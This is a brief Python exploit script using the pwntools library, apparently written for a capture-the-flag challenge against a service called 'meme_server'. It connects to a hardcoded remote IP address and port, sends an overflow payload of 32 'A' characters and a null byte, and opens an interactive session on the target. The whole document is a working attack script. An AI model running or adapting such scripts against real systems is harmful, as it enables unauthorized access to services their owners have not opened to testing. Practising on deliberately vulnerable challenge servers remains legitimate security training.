from pwn import *

context(arch='i386', os='linux')

#p = process('./meme_server', stdout=PIPE)
p= remote("185.66.87.233","5004")


p.sendline("A"*32+"\x00"*1)




p.interactive()
